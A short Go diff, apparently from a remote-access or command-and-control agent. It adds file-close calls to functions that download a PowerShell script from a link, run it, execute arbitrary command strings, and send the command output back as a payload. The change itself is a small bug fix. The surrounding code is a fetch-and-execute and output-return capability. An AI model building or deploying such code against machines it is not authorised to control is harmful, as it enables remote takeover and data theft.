@@ -22,6 +22,7 @@ func ExecutePowershellScriptFromInternet(link string) {
 	utils.DownloadFile(link, tempFile)
 	shell, _ := exec.LookPath("powershell")
 
+	tempFile.Close()
 	output := executeFileInShell(tempFile.Name(), shell)
 	payload := url.Values{
 		"command_output": {output},
@@ -36,6 +37,8 @@ func executeStringInShell(command string) string {
 	defer tempFile.Close()
 
 	utils.SaveStringAsFile(command, tempFile)
+
+	tempFile.Close()
 	shell, _ := exec.LookPath("powershell")
 
 	return executeFileInShell(tempFile.Name(), shell)
